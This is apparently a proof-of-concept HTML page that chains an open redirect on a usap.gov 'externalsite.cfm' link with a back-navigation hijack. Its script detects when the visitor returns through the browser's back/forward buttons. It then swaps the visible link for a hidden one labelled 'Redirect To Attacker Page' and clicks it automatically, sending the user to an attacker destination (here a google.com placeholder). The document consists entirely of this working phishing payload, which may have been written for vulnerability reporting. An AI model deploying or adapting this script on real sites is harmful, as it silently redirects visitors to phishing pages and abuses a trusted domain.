
<div id="forward">
    <a href="https://www.usap.gov/externalsite.cfm?http://www.nsf.com">USAP Page</a>
</div>
<div id="phish">
    <a href="https://google.com">Redirect To Attacker  Page.......</a>
</div>
<script>
function hide(id) {
    document.getElementById(id).style.display = 'none';
}

function show(id) {
    document.getElementById(id).style.display = '';
}

window.addEventListener("pageshow", function () {
    if (performance.navigation.type === performance.navigation.TYPE_BACK_FORWARD) {
        hide("forward");
        show("phish");
        document.querySelector("#phish a").click();
    } else {
        hide("phish");
        show("forward");

    }
});
</script>
